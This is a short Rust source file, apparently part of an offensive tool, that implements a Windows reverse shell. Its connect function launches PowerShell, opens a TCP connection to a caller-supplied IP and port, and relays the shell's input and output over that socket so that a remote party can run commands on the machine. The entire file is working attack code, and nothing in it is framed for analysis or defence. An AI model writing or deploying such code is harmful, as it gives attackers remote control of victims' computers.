use std::fs::File;
use std::net::TcpStream;
use subprocess::{Popen, PopenConfig, Redirection};

use super::common;

pub fn connect(ip: String, port: String){
    let socket = [ip, port].join(":"); 
    let mut p = Popen::create(
        &["powershell"],
        PopenConfig {
            stdin: Redirection::Pipe,
            stdout: Redirection::Pipe,
            stderr: Redirection::Merge,
            ..Default::default()
        },
    )
    .expect("Failed to start shell.");

    let stdin: File = p.stdin.take().unwrap().into();
    let stdout_err: File = p.stdout.take().unwrap().into();
    let stream = TcpStream::connect(socket).unwrap();

    let t1 = common::pipe_thread(stdout_err, stream.try_clone().unwrap());
    let t2 = common::pipe_thread(stream, stdin);
    let _ = t1.join();
    let _ = t2.join();   
}

